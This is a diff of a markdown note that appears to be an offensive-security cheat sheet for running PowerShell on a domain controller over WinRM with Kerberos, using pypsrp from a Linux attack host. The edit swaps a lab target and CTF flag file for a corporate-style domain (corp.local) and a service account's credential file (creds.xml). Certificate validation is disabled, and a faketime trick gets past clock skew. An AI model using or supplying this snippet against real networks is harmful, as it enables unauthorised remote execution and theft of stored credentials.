@@ -70,9 +70,9 @@ Authenticating WinRM with a Kerberos ticket from a Linux attack host repeatedly 
 
 ```python
 from pypsrp.client import Client          # ships in the python netexec uses
-c = Client("dc01.domain.htb", auth="kerberos", negotiate_service="HTTP",
+c = Client("dc01.corp.local", auth="kerberos", negotiate_service="HTTP",
            ssl=True, cert_validation=False)
-out, streams, had_err = c.execute_ps("whoami; type C:\\Users\\u\\Desktop\\user.txt")
+out, streams, had_err = c.execute_ps("whoami; hostname; type C:\\Users\\svc_bkp\\Documents\\creds.xml")
 ```
 Wrap the whole call in `faketime '+Xh'` if the DC clock skews (see `kerberos-only-and-badsuccessor.md` clock-skew matrix).
 
